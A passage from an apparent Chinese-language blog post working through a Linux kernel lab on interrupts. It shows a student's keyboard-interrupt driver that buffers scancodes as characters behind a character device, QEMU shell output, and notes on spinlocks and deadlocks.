class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/interrupt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/spinlock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;KBD&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_NAME		<span class="meta-string">&quot;kbd&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBD_MAJOR		42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBD_MINOR		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBD_NR_MINORS	1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I8042_KBD_IRQ		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I8042_STATUS_REG	0x64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I8042_DATA_REG		0x60</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE		1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCANCODE_RELEASED_MASK	0x80</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 3: add spinlock */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span> put_idx, get_idx, count;</span><br><span class="line">&#125; devs[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks if scancode corresponds to key press or release.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">is_key_press</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> scancode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(scancode &amp; SCANCODE_RELEASED_MASK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Return the character of the given scancode.</span></span><br><span class="line"><span class="comment"> * Only works for alphanumeric/space/enter; returns &#x27;?&#x27; for other</span></span><br><span class="line"><span class="comment"> * characters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_ascii</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> scancode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *row1 = <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *row2 = <span class="string">&quot;qwertyuiop&quot;</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *row3 = <span class="string">&quot;asdfghjkl&quot;</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *row4 = <span class="string">&quot;zxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line">	scancode &amp;= ~SCANCODE_RELEASED_MASK;</span><br><span class="line">	<span class="keyword">if</span> (scancode &gt;= <span class="number">0x02</span> &amp;&amp; scancode &lt;= <span class="number">0x0b</span>)</span><br><span class="line">		<span class="keyword">return</span> *(row1 + scancode - <span class="number">0x02</span>);</span><br><span class="line">	<span class="keyword">if</span> (scancode &gt;= <span class="number">0x10</span> &amp;&amp; scancode &lt;= <span class="number">0x19</span>)</span><br><span class="line">		<span class="keyword">return</span> *(row2 + scancode - <span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">if</span> (scancode &gt;= <span class="number">0x1e</span> &amp;&amp; scancode &lt;= <span class="number">0x26</span>)</span><br><span class="line">		<span class="keyword">return</span> *(row3 + scancode - <span class="number">0x1e</span>);</span><br><span class="line">	<span class="keyword">if</span> (scancode &gt;= <span class="number">0x2c</span> &amp;&amp; scancode &lt;= <span class="number">0x32</span>)</span><br><span class="line">		<span class="keyword">return</span> *(row4 + scancode - <span class="number">0x2c</span>);</span><br><span class="line">	<span class="keyword">if</span> (scancode == <span class="number">0x39</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (scancode == <span class="number">0x1c</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_char</span><span class="params">(struct kbd *data, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (data-&gt;count &gt;= BUFFER_SIZE)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	data-&gt;buf[data-&gt;put_idx] = c;</span><br><span class="line">	data-&gt;put_idx = (data-&gt;put_idx + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">	data-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">get_char</span><span class="params">(<span class="keyword">char</span> *c, struct kbd *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 4: get char from buffer; update count and get_idx */</span></span><br><span class="line">	<span class="keyword">if</span> (data-&gt;count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		*c = data-&gt;buf[data-&gt;get_idx];</span><br><span class="line">		data-&gt;get_idx = (data-&gt;get_idx + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">		data-&gt;count--;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reset_buffer</span><span class="params">(struct kbd *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 5: reset count, put_idx, get_idx */</span></span><br><span class="line">	printk(<span class="string">&quot;reset&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(data-&gt;count != <span class="number">0</span>)&#123;</span><br><span class="line">		data-&gt;buf[data-&gt;put_idx] = <span class="number">0</span>;</span><br><span class="line">		data-&gt;put_idx = (data-&gt;put_idx - <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">		data-&gt;count --;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Return the value of the DATA register.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u8 <span class="title">i8042_read_data</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u8 val;</span><br><span class="line">	<span class="comment">/* TODO 3: Read DATA register (8 bits). */</span></span><br><span class="line">	val = inb(I8042_DATA_REG);</span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 2: implement interrupt handler */</span></span><br><span class="line">	<span class="comment">/* TODO 3: read the scancode */</span></span><br><span class="line">	<span class="comment">/* TODO 3: interpret the scancode */</span></span><br><span class="line">	<span class="comment">/* TODO 3: display information about the keystrokes */</span></span><br><span class="line">	<span class="comment">/* TODO 3: store ASCII key to buffer */</span></span><br><span class="line"><span class="function"><span class="keyword">irqreturn_t</span> <span class="title">kbd_interrupt_handler</span><span class="params">(<span class="keyword">int</span> irq_no,<span class="keyword">void</span>* dev_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span>* <span class="title">data</span> =</span> (struct kbd*)dev_id;</span><br><span class="line">	u8 scancode = i8042_read_data();</span><br><span class="line">	<span class="keyword">int</span> pressed = is_key_press(scancode);</span><br><span class="line">	<span class="keyword">int</span> key = get_ascii(scancode);</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;IRQ: %d, scancode = 0x%x (%u), pressed = %d, ch = %c\n&quot;</span>,</span><br><span class="line">        irq_no, scancode, scancode, pressed, key);</span><br><span class="line">	<span class="keyword">if</span>(!pressed)&#123;</span><br><span class="line">		<span class="keyword">return</span> IRQ_NONE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;data-&gt;lock);</span><br><span class="line">	put_char(data,key);</span><br><span class="line">	spin_unlock(&amp;data-&gt;lock);</span><br><span class="line">	<span class="keyword">return</span> IRQ_NONE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kbd_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> *<span class="title">data</span> =</span> container_of(inode-&gt;i_cdev, struct kbd, cdev);</span><br><span class="line"></span><br><span class="line">	file-&gt;private_data = data;</span><br><span class="line">	pr_info(<span class="string">&quot;%s opened\n&quot;</span>, MODULE_NAME);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kbd_release</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;%s closed\n&quot;</span>, MODULE_NAME);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 5: add write operation and reset the buffer */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">kbd_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> *<span class="title">data</span> =</span> (struct kbd*) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag;</span><br><span class="line"></span><br><span class="line">	spin_lock_irqsave(&amp;data-&gt;lock,flag);</span><br><span class="line">	reset_buffer(data);</span><br><span class="line">	spin_unlock_irqrestore(&amp;data-&gt;lock,flag);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">kbd_read</span><span class="params">(struct file *file,  <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> *<span class="title">data</span> =</span> (struct kbd *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">size_t</span> read = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">bool</span> more = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: read data from buffer */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(size--)&#123;</span><br><span class="line">		spin_lock_irqsave(&amp;data-&gt;lock,flag);</span><br><span class="line">		more = get_char(&amp;ch,data);</span><br><span class="line">		spin_unlock_irqrestore(&amp;data-&gt;lock,flag);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!more)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put_user(ch,user_buffer++))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		read++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">kbd_fops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.open = kbd_open,</span><br><span class="line">	.release = kbd_release,</span><br><span class="line">	.read = kbd_read,</span><br><span class="line">	<span class="comment">/* TODO 5: add write operation */</span></span><br><span class="line">	.write = kbd_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kbd_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	err = register_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),</span><br><span class="line">				     KBD_NR_MINORS, MODULE_NAME);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">		pr_err(<span class="string">&quot;register_region failed: %d\n&quot;</span>, err);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: request the keyboard I/O ports */</span></span><br><span class="line">	<span class="keyword">if</span>(!request_region(I8042_DATA_REG+<span class="number">1</span>,KBD_NR_MINORS, MODULE_NAME)) &#123;</span><br><span class="line">		err = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out_unregister;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!request_region(I8042_STATUS_REG+<span class="number">1</span>, KBD_NR_MINORS, MODULE_NAME)) &#123;</span><br><span class="line">		err = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out_unregister;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 3: initialize spinlock */</span></span><br><span class="line">	spin_lock_init(&amp;devs[<span class="number">0</span>].lock);</span><br><span class="line">	<span class="comment">/* TODO 2: Register IRQ handler for keyboard IRQ (IRQ 1). */</span></span><br><span class="line">	err = request_irq(I8042_KBD_IRQ,kbd_interrupt_handler,</span><br><span class="line">		IRQF_SHARED,MODULE_NAME,&amp;devs[<span class="number">0</span>]);</span><br><span class="line">	<span class="keyword">if</span>(err)&#123;</span><br><span class="line">		<span class="keyword">goto</span> out_release_regions;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cdev_init(&amp;devs[<span class="number">0</span>].cdev, &amp;kbd_fops);</span><br><span class="line">	cdev_add(&amp;devs[<span class="number">0</span>].cdev, MKDEV(KBD_MAJOR, KBD_MINOR), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	pr_notice(<span class="string">&quot;Driver %s loaded\n&quot;</span>, MODULE_NAME);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*TODO 2: release regions in case of error */</span></span><br><span class="line">out_release_regions:</span><br><span class="line">	release_region(I8042_STATUS_REG+<span class="number">1</span>, KBD_NR_MINORS);</span><br><span class="line">	release_region(I8042_DATA_REG+<span class="number">1</span>, KBD_NR_MINORS);</span><br><span class="line">out_unregister:</span><br><span class="line">	unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),</span><br><span class="line">				 KBD_NR_MINORS);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kbd_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cdev_del(&amp;devs[<span class="number">0</span>].cdev);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Free IRQ. */</span></span><br><span class="line">	free_irq(I8042_KBD_IRQ,&amp;devs[<span class="number">0</span>]);</span><br><span class="line">	<span class="comment">/* TODO 1: release keyboard I/O ports */</span></span><br><span class="line">	release_region(I8042_STATUS_REG+<span class="number">1</span>,KBD_NR_MINORS);</span><br><span class="line">	release_region(I8042_DATA_REG+<span class="number">1</span>,KBD_NR_MINORS);</span><br><span class="line">	unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),</span><br><span class="line">				 KBD_NR_MINORS);</span><br><span class="line">	pr_notice(<span class="string">&quot;Driver %s unloaded\n&quot;</span>, MODULE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kbd_init);</span><br><span class="line">module_exit(kbd_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：当 <code>insmod</code> 这个驱动程序时可能会报错</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># insmod skels/interrupts/kbd.ko</span></span><br><span class="line">kbd: loading out-of-tree <span class="keyword">module</span> taints kernel.</span><br><span class="line">insmod: can<span class="number">&#x27;</span>t insert <span class="string">&#x27;skels/interrupts/kbd.ko&#x27;</span>: Device <span class="keyword">or</span> resource busy</span><br></pre></td></tr></table></figure>
<ul>
<li>这是因为键盘 IO 已经有对应的驱动了：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># cat /proc/ioports | egrep <span class="meta-string">&quot;(0060|0064)&quot;</span></span></span><br><span class="line"><span class="number">0060</span><span class="number">-0060</span> : keyboard</span><br><span class="line"><span class="number">0064</span><span class="number">-0064</span> : keyboard</span><br></pre></td></tr></table></figure>
<ul>
<li>键盘 I/O 端口是在引导期间由内核注册的，我们将无法删除关联的模块</li>
<li>因此，我们需要欺骗内核并注册 0x61 和 0x65 端口</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/interrupts<span class="meta"># insmod kbd.ko                                  </span></span><br><span class="line">kbd: loading out-of-tree <span class="keyword">module</span> taints kernel.                                  </span><br><span class="line">Driver kbd loaded                                                               </span><br><span class="line">root@qemux86:~/skels/interrupts<span class="meta"># cat /proc/ioports | grep kbd                   </span></span><br><span class="line">  <span class="number">0061</span><span class="number">-0061</span> : kbd                                                               </span><br><span class="line">root@qemux86:~/skels/interrupts<span class="meta"># rmmod kbd                                      </span></span><br><span class="line">Driver kbd unloaded        </span><br></pre></td></tr></table></figure>
<ul>
<li>当中断注册完成以后，可以在 <code>/proc/interrupts</code> 中进行查看：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/interrupts<span class="meta"># cat /proc/interrupts                           </span></span><br><span class="line">           CPU0                                                                 </span><br><span class="line">  <span class="number">0</span>:         <span class="number">68</span>   IO-APIC   <span class="number">2</span>-edge      timer                                   </span><br><span class="line">  <span class="number">1</span>:          <span class="number">9</span>   IO-APIC   <span class="number">1</span>-edge      i8042, kbd                              </span><br><span class="line">  <span class="number">9</span>:          <span class="number">0</span>   IO-APIC   <span class="number">9</span>-fasteoi   acpi                                    </span><br><span class="line"> <span class="number">10</span>:        <span class="number">452</span>   IO-APIC  <span class="number">10</span>-fasteoi   virtio1, virtio2, virtio5               </span><br><span class="line"> <span class="number">11</span>:         <span class="number">13</span>   IO-APIC  <span class="number">11</span>-fasteoi   virtio3, virtio4, virtio0               </span><br><span class="line"> <span class="number">12</span>:        <span class="number">125</span>   IO-APIC  <span class="number">12</span>-edge      i8042    </span><br></pre></td></tr></table></figure>
<ul>
<li>通过如下命令可以在虚拟机中打开键盘：（用来查看 <code>kbd_interrupt_handler</code> 是否正确）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_DISPLAY=gtk make boot </span><br></pre></td></tr></table></figure>
<img src="/2022/10/15/Linux-Lab4-IO%20access%20and%20Interrupts/1665767353033-1665905122545.png" class width="1665767353033"> 
<ul>
<li>被这个多线程和锁搞得头痛，有时候莫名其妙陷入死锁，尝试使用 <code>printk</code> 打印时还报错，看了答案以后进行了大刀阔斧的修改才解决了问题</li>
<li>另外 <code>i8042_read_data</code> 实际上是使用了系统自带的键盘 IO 端口（程序中自己申请的 IO 端口其实就是花架子，不影响程序流程）</li>
<li>在程序输入输出的地方都需要用锁，但是如果在程序拿到锁的情况下发生中断，中断中也要拿同一个锁的情况下就会发生问题（硬件中断在任何时候都会发生）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irqsave(&amp;data-&gt;lock,flag);</span><br><span class="line">more = get_char(&amp;ch,data);</span><br><span class="line">spin_unlock_irqrestore(&amp;data-&gt;lock,flag);</span><br></pre></td></tr></table></figure>
<ul>
<li>所以使用 <code>spin_lock_irqsave</code> 在加锁的同时禁止中断</li>
</ul>
<p>仔细对比了答案以后，又分析了一下之前死锁的原因，感觉问题应该出在 <code>cat</code> 中：</p>
<ul>
<li><code>kbd_open</code> 正常执行</li>
<li><code>kbd_read</code> 有返回但是无限循环</li>
<li><code>kbd_release</code> 根本不会执行，程序卡死在 <code>kbd_read</code> 中</li>
</ul>
<p>我之前的代码是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">kbd_read</span><span class="params">(struct file *file,  <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> *<span class="title">data</span> =</span> (struct kbd *) 